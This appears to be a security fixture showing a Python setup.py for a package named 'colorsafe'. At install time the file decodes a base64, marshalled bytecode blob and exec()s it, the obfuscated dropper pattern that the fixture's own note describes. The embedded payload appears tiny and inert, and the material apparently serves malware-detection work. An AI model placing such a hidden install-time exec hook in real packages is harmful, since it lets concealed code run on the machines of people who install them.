name: pypi-setup-marshal-exec-dropper
note: setup.py exec()s a marshalled (compiled-bytecode) payload decoded from base64 at install time — a marshal.loads variant of the sdist dropper that hides the code even from a casual source read.

sourceFiles.setup.py:
from setuptools import setup
import marshal, base64

_code = marshal.loads(base64.b64decode("YwAAAAAAAAAAAAAAAAEAAABzBAAAAGQAUwApAU4pACkAKQByAQAAAPoAcgIAAAA="))
exec(_code)

setup(name="colorsafe", version="1.0.0", py_modules=["colorsafe"])
